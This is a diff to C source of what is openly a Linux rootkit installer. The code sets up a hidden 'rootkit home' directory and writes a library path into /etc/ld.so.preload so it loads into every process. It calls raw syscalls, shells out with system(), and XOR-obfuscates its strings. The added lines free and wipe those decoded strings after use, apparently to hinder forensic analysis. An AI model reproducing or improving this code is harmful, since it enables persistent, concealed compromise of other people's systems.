@@ -17,10 +17,14 @@ int is_rk_home_setup(void) {
             struct stat libn_buf;
             if ((syscall(4, libz, &libz_buf) != -1) && (syscall(4, libn, &libn_buf) != -1 )) {
                 DEBUG_MSG("[-] Rootkit is already set up in home directory %s\n", rk_home);
+                CLEAN(libz);
+                CLEAN(libn);
+                CLEAN(rk_home);
                 return 1;
             }
         }
     }
+    CLEAN(rk_home);
     return 0;
 }
 
@@ -57,6 +61,12 @@ int setup_rk_home(char *libzpoline_path, char *nopfrog_path) {
     DEBUG_MSG("[-] cmd: %s\n", cmd);
     system(cmd);
     DEBUG_MSG("[-] Created rootkit backup directory\n");
+
+    // cleanup
+    CLEAN(mkdir);
+    CLEAN(rk_home);
+    CLEAN(mv);
+    CLEAN(rk_backup);
     return 1;
 }
 
@@ -67,9 +77,11 @@ int write_to_ld_so_preload(char *ld_path) {
     int fd = syscall(2, ld_so_preload_path, O_RDWR|O_CREAT, 0644);
     if (syscall(1, fd, ld_path, strlen(ld_path)) != -1) {
         DEBUG_MSG("[-] Wrote rk_home path to /etc/ld.so.preload\n");
+        CLEAN(ld_so_preload_path);
         return 1;
     }
     DEBUG_MSG("[-] Failed to write rk_home path to /etc/ld.so.preload\n");
+    CLEAN(ld_so_preload_path);
     return 0;
 }
 
@@ -83,8 +95,12 @@ int backup_ld_so_preload(char *ld_path) {
         DEBUG_MSG("[-] cmd: %s\n", cmd);
         system(cmd);
         DEBUG_MSG("[-] Backed up /etc/ld.so.preload\n"); 
+        CLEAN(rk_backup);
+        CLEAN(rk_home);
         return 1;
     }
+    CLEAN(rk_backup);
+    CLEAN(rk_home);
     return 1;
 }
 
@@ -114,6 +130,9 @@ int install_rk(char *libzpoline_path, char *nopfrog_path){
         sprintf(ld_path, "%s%s", rk_home, libz);
         DEBUG_MSG("[-] rk_path: %s\n", ld_path);
         if (write_to_ld_so_preload(ld_path)) {
+            CLEAN(rk_home);
+            CLEAN(rk_backup);
+            CLEAN(libz);
             return 1;
         }
     }
@@ -132,6 +151,11 @@ int install_rk(char *libzpoline_path, char *nopfrog_path){
             char ld_path[2048];
             sprintf(ld_path, "%s%s", rk_home, libz);
             // Write lib path to /etc/ld.so.preload
+            CLEAN(rk_home);
+            CLEAN(rk_backup);
+            CLEAN(set_mmap_min_addr);
+            CLEAN(libz);
+            CLEAN(ld_so_preload_path);
             if (write_to_ld_so_preload(ld_path)) {
                 return 1;
             }
@@ -139,6 +163,8 @@ int install_rk(char *libzpoline_path, char *nopfrog_path){
             return 0;
         }
     }
+    CLEAN(rk_home);
+    CLEAN(rk_backup);
     return 0;
 }
 
@@ -160,6 +186,11 @@ int uninstall_rk(){
         sprintf(cmd, "%s %s %s", mv, ld_backup_path, ld_path);
         system(cmd);
         DEBUG_MSG("[-] Restored /etc/ld.so.preload from backup\n");
+        CLEAN(rk_home);
+        CLEAN(rk_backup);
+        CLEAN(ld_path);
+        CLEAN(ld_backup);
+        CLEAN(mv);
         return 1;
     }
     else {
@@ -167,6 +198,11 @@ int uninstall_rk(){
         char *rm = strdup(RM); xor(RM);
         sprintf(cmd, "%s %s", rm, ld_path);
         DEBUG_MSG("[-] Removed /etc/ld.so.preload\n");
+        CLEAN(rk_home);
+        CLEAN(rk_backup);
+        CLEAN(ld_path);
+        CLEAN(ld_backup);
+        CLEAN(rm);
         return 1;
     }
     
